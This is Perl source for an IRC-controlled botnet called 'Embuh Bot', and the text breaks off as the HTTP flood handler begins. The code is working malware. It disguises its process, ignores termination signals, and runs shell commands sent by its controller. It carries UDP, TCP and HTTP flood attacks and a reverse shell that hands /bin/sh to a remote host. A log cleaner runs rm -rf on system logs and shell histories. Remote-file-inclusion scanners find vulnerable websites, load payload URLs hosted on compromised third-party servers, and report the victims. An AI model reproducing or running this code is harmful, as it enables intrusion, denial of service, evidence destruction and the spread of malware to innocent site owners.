#!/usr/bin/perl
# Embuh Bot
#
# Coded by : ZOnMaNZ
#
# Thanks to : 
# Ex0d3us for the Scanner
# r0x00k  for testing and helping
# 
# Greets to :
# ASC @ irc.penyamun.us.to
# 
#
#You can use the following commands :
#!bot @portscan <ip>
#!bot @back <ip><port>	
#!bot @udpflood <ip> <packet size> <time>
#!bot @tcpflood <ip> <port> <packet size> <time>
#!bot @httpflood <site> <time>
#!bot @linuxhelp
#!bot @multiscan <vuln> <dork>
#!bot @googlescan <vuln> <dork>
#!bot @system
#!bot @milw0rm
#!bot @join <#channel>	
#!bot @part <#channel>
#!bot @help
#!bot cd tmp for example
#
#
########################################################################################################################
#     ______  __________     ___     _________    ____    __________________                                                                                             
#    /  __  \/ ___   / /    /  /    /  ___/   \  /  / \  /  / __   ___   ___/                                                                         
#   /  /  \   /  /  / /    /  /____/  /__   /  \/  /\  \/  / / /  /  /  /                                                                   
#  /  /   /  /  /  / /    /     __   ___/  /\  /  /  \    / / /  /  /  /                                                                            			
# /  /___/  /__/  / /____/  /\  \/  /__   /  \   /   /   / /_/  /  /  /                                                                                              
#/________/______/______/__/ /__/_____/__/    \_/   /___/______/  /__/                                                                                        
#
########################################################################################################################

######################
use HTTP::Request;
use LWP::UserAgent;
######################
my $processo = 'init';
######################


######################
#   Configuration    # 
#                    #
############################################
my $linas_max='6';
#                                          #
# Maximum Lines for Anti Flood             #
############################################
my $sleep='10';
#                                          #                                      
#Sleep Time                                #
############################################
my @cmdstring='http://phoenixgc.net/sikat?';
#                                          #
#CMD String                                #
############################################
my @adms=("ZOnMaNZ");
#                                          #
#Admins of the Bot set your nickname here  #
############################################
my @canais=("#FaToNeX");
#                                          #
#Put your channel here                     #
############################################
my @nickname = ("temmia");
my $nick = $nickname[rand scalar @nickname];
#                                          #
#Nickname of bot                           #
############################################
my $ircname ='ZOnMaNZ';
chop (my $realname = 'ZOnMaNZ');
#                                          #
#IRC name and Realname                     #
############################################
$servidor='irc.mildnet.org' unless $servidor;
my $porta='6667';
#                                          #
#IRCServer and port                        #
############################################
my $VERSAO = '4,1 PePeX ';
#Dont Change                               #
############################################
#End of Configuration# 
#                    #
######################
$SIG{'INT'} = 'IGNORE';
######################
$SIG{'HUP'} = 'IGNORE';
######################
$SIG{'TERM'} = 'IGNORE';
######################
$SIG{'CHLD'} = 'IGNORE';
######################
$SIG{'PS'} = 'IGNORE';
######################
use IO::Socket;
######################
use Socket;
######################
use IO::Select;
######################
chdir("/");
######################
#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 Embuh\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
#End of Connect
  
######################
#      PREFIX        #
#                    #
######################
# You can change the prefix if you want but the commands will be different 
# The standard prefix is !bot if you change it into !bitch for example 
# every command will be like !bitch @udpflood, !bitch @googlescan.
# So its recommended not to change this ;)
######################
  
  if ($args =~ /^(\Q$meunick\E|\!bot)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
#                    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick|".int rand(999999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         # 
#                    #
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT  Help");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 Select the function you want help for");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@rfiscan");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 Or if you want too know all the commands type:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@commands");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT  Help");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 There are 3 DDossers in this bot");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@httpflood <site> <time>");

}

if ($funcarg =~ /^rfiscan/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 This bot also contains a RFI Scanner.");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 You have multiengine scan that contains :12G4o8o12g9l4e4,2Altavista4,7All7The7Web4,14A4S14K4 and 7AOL  ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 Or you can just scan with google ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 Commands :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@multiscan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@googlescan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 You can find strings here : http://www.xshqiptaretx.org/strings.txt ");

}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 You use backconnect like this :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@back <ip><port>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT ");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 This bot has a integrated shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 You can use it in private but also public in the channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 In public channel just use : 7!bot cd tmp12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 For help with the linux commands type :!bot 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT ");

}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 The portscanner is very easy to use just type the following :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT ");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 You can use the following commands :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot cd tmp 12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@multiscan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@googlescan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 !bot 7@part #channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Help12:.4| 12 11,1 Embuh BOT ");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Dir where you are : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4LiNuX12:.4| - 12 Find all service.pwd files : find / -type f -name service.pwd");
}

if ($funcarg =~ /^cmd/) {
	sendraw($IRC_cur_socket, "PRIVMSG dolkenyot :http://bigforex.com/public_html//admin/install/language/.id2");

}

if ($funcarg =~ /^clear/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:13LogCleaner12:.4|13 This process can be long, just wait"); 
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:13LogCleaner12:.4|13 All default log and bash_history files erased"); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:13LogCleaner12:.4|13 Now Erasing the rest of the machine log files");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:13LogCleaner12:.4|13 Done! All logs erased"); 

}
######################
#   End of  Help     # 
#                    #
######################

######################
#     Commands       # 
#                    #
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Info BOT : 7 Servidor :Hiden : 6667");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Owner        : 7 The_Embuh");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Channel      : 7 #Embuh");
}

if ($funcarg =~ /^milw0rm/) {
	my @ltt=();
	my @bug=();
	my $x;
	my $page="";
	my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
	print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$socke>;
	$page="@r";
	close($socke);
	while ($page =~  m/<title>(.*)</g){
	$x = $1;
	if ($x =~ /\&lt\;/) {
	$x =~ s/\&lt\;/</g;
	}
	if ($x !~ /milw0rm/) {
	push (@bug,$x);
	}}
	while ($page =~  m/<link.*expl.*([0-9]...)</g) {
	if ($1 !~ m/milw0rm.com|exploits|en/){
	push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
	}}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:9milw0rm12:.4|12 Latest exploits :");
	foreach $x (0..(@ltt - 1)) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:9milw0rm12:.4|12  $bug[$x] - $ltt[$x]");
	sleep 1;
}}
######################
#      Portscan      # 
#                    #
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Port Scan12:.4|12 Scanning for open ports on  4".$1." 12 started .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Port Scan12:.4|12 Open ports founded: @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Port Scan12:.4|12 No open ports foundend.");
  }
}

######################
#  End of  Portscan  # 
#                    #
######################
######################
#  Join And Part     # 
#                    #
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
	   if ($funcarg =~ /^die (.*)/) {
	      sendraw($IRC_cur_socket, "Exit :dolkenyot caem");
	   }	   
######################
#End of Join And Part# 
#                    #
######################
######################
#     TCPFlood       # 
#                    #
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4TCP DDos12:.4|12 Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :4|12.:4TCP DDos12:.4| 12Attack done 4 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
#                    #
######################
######################
#   Back Connect     # 
#                    #
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4BackConnect12:.4|12 Connecting to 4 $host:$porta");
}
}
######################
#End of  Back Connect# 
#                    #
######################
######################
#    MULTI SCANNER   # 
#                    #
######################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
### Start Message
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Starting Scan for 4$bug 12$dork");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Initializing on 45 12Search Engines ");
### End of Start Message
my @glist=&google($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 12G4o8o12g9l4e4 ".scalar(@glist)." 12Sites");
my @vlist=&virgilio($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 3Virgilio4 ".scalar(@vlist)." 12Sites");
my @alist=&altavista($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 2Altavista4 ".scalar(@alist)." 12Sites");
my @allist=&alltheweb($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 7All7The7Web4 ".scalar(@allist)." 12Sites");
my @asklist=&ask($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 14A4S14K4 ".scalar(@asklist)." 12Sites");
my @mlist=&msn($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 12M4s3N4 ".scalar(@mlist)." 12Sites");
my @flist=&fireball($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 4F1ireball4 ".scalar(@flist)." 12Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Results for $dork");
push(my @tot, @glist, @vlist, @alist, @allist, @asklist, @mlist, @flist);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Total Results4 ".scalar(@tot)." 12Sites");
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Exploiting Started For ".scalar(@puliti)." 12Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Exploiting");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;

if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4| Finished for $bug $dork");
}
### Print CMD and TEST CMD d0nt change the TEST cmd !........###
my $test="http://".$sito.$bug."http://bigforex.com/public_html//admin/install/language/.id2?"."?";
my $print="http://".$sito.$bug."http://xXx.txt"."?";
### End of Print CMD and TEST CMD d0nt change the TEST cmd !.###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(15);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /FeeLCoMz/ && $re =~ /SAFE: OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Safe Mode = 4OFF12:.4|12 Type: 4$type, 12Free:4 $space, 12Vuln: 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG dolkenyot :4|12.:4Safe Mode = 4OFF12:.4|12 Type: 4$type, 12Free: 4$space, 12Vuln: 4$print ");
my $test2="http://".$sito.$bug."http://www.stmellonsshow.org.uk/cms//plugins/referral/sikud.txt?"."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /SAFE: ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Safe Mode = 3ON12:.4|12 Type: 4$type, 12Free:4 $space, 12Vuln: 4$print  ");
my $test2="http://".$sito.$bug."http://www.stmellonsshow.org.uk/cms//plugins/referral/sikud.txt?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}}
######################
#End of MultiSCANNER # 
#                    #
######################
######################
#    GOOGLESCANNER   # 
#                    #
######################
if ($funcarg =~ /^google\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
	if (fork) {
	exit;
	} else {
	my $bug=$1;
	my $dork=$2;
	my $contatore=0;
	my ($type,$space);
	my %hosts;
		### Start Message
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Starting 12G4o8o12g9l4e12Scan for 4$bug 12$dork");
		### End of Start Message		
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:12G4o8o12g9l4e12:.4|412 Started4");
		my @glist=&google($dork);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Results for $dork");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 12G4o8o12g9l4e4 ".scalar(@glist)." 12Sites");
		push(my @tot, @glist);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Filtering Cleaned results of 4 ".scalar(@tot)." 12Sites");
		my @puliti=&unici(@tot);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Cleaned Results ".scalar(@puliti)." 12Sites");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4|12 Exploiting Started");
		my $uni=scalar(@puliti);
		foreach my $sito (@puliti)
		{
		$contatore++;
		if ($contatore==$uni-1){
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Scan12:.4| Finished for $bug $dork");
	}
		### Print CMD and TEST CMD d0nt change the TEST cmd !........###
		my $test="http://".$sito.$bug."http://bigforex.com/public_html//admin/install/language/.id2?"."?";
		my $print="http://".$sito.$bug."http://xxx/sikat"."?";
		### End of Print CMD and TEST CMD d0nt change the TEST cmd !.###
	my $req=HTTP::Request->new(GET=>$test);
	my $ua=LWP::UserAgent->new();
		$ua->timeout(5);
		my $response=$ua->request($req);
		if ($response->is_success) {
		my $re=$response->content;
		if($re =~ /FeeLCoMz/ && $re =~ /SAFE: OFF/){
		my $hs=geths($print); $hosts{$hs}++;
		if($hosts{$hs}=="1"){
		$x=os($test);
		($type,$space)=split(/\,/,$x);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Safe Mode = 4OFF12:.4|12 Type: 4$type, 12Free: 4$space, 12Vuln: 4$print ");
	sendraw($IRC_cur_socket, "PRIVMSG dolkenyot :Safe Mode = OFF : $print");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Spread12:.4|12 Loading spread");
		my $test2="http://".$sito.$bug."http://www.stmellonsshow.org.uk/cms//plugins/referral/sikud.txt?";
		my $reqz=HTTP::Request->new(GET=>$test2);
		my $ua=LWP::UserAgent->new();
		my $response=$ua->request($reqz);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Spread12:.4|12 Spread loaded");
		}}
		elsif($re =~ /SAFE: ON/)
		{
		my $hs=geths($print); $hosts{$hs}++;
		if($hosts{$hs}=="1"){
		$x=os($test);
		($type,$space)=split(/\,/,$x);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Safe Mode = 3ON12:.4|12 Type: 4$type, 12Free: 4$space, 12Vuln: 4$print  ");
	sendraw($IRC_cur_socket, "PRIVMSG dolkenyot :Safe Mode = ON : $print  ");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Spread12:.4|12 Loading spread");
		my $test2="http://".$sito.$bug."http://www.stmellonsshow.org.uk/cms//plugins/referral/sikud.txt?";
		my $reqz=HTTP::Request->new(GET=>$test2);
		my $ua=LWP::UserAgent->new();
		my $response=$ua->request($reqz);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4Spread12:.4|12 Spread loaded");
}}
}}}
exit;
}}	
######################
#End of GOOGLESCANNER# 
#                    #
######################
######################
#     HTTPFlood      # 
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
